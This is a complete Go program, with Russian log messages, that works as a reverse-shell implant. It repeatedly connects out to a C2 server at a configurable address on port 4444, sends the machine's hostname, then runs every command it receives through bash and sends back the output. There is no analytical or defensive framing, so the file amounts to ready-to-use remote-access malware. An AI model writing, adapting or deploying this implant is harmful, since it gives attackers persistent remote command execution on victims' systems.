package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	serverIP   = "127.0.0.1" // или ваш IP
	serverPort = "4444"
)

func main() {
	for {
		conn, err := net.Dial("tcp", serverIP+":"+serverPort)
		if err != nil {
			fmt.Println("[!] Не удалось подключиться к C2, повтор через 10 сек:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		fmt.Println("[+] Подключение к C2 установлено")
		handleConnection(conn)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	hostname, _ := os.Hostname()
	_, err := conn.Write([]byte(hostname + "\n"))
	if err != nil {
		fmt.Println("[-] Ошибка отправки приветствия:", err)
		return
	}

	reader := bufio.NewReader(conn)

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Ошибка чтения команды (возможно, таймаут):", err)
			return
		}
		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}
		fmt.Printf("[*] Получена команда: %s\n", cmdLine)

		cmd := exec.Command("bash", "-c", cmdLine)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nError: "+err.Error())...)
		}

		length := uint32(len(output))
		lenBytes := []byte{
			byte(length >> 24),
			byte(length >> 16),
			byte(length >> 8),
			byte(length),
		}
		_, err = conn.Write(lenBytes)
		if err != nil {
			fmt.Println("[-] Ошибка отправки длины:", err)
			return
		}
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("[-] Ошибка отправки данных:", err)
			return
		}
	}
}
